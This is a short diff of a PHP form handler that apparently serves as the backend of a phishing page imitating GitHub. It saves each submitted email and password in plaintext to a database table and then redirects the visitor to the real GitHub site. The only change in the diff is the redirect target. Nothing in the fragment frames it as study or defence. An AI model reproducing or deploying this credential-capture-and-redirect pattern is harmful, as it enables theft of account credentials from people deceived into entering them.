@@ -15,7 +15,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $stmt = $conn->prepare(query: ' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
         $stmt->execute(params: array ($_POST["email"], $_POST["pass"]));
         // echo "feito";
-        header(header: "Location:https://github.com/login");
+        header(header: "Location:https://github.com");
     }else{
         header(header: "Location:/");
     }
